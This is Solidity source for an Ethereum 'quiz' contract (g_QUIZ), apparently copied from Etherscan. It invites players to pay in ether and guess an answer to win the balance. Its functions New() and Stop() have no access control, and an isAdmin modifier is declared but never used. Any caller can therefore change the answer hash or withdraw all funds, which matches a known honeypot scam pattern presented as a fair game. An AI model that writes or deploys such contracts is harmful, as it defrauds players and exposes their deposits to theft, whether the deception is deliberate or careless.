/**
 *Submitted for verification at Etherscan.io on 2021-10-20
*/

/**
 *Submitted for verification at Etherscan.io on 2021-10-20
*/

contract g_QUIZ
{
    function Try(string memory _response) public
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)))
        {
            payable(msg.sender).transfer(address(this).balance);
            return;
        }
        
        revert("test");
    }

    string public question;

    bytes32 responseHash;

    mapping (bytes32=>bool) admin;

    function Start(string calldata _question, string calldata _response) public payable {
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable  {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _responseHash) public payable  {
        question = _question;
        responseHash = _responseHash;
    }

    constructor() {

    }
    


    modifier isAdmin(){
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    fallback() external {}
}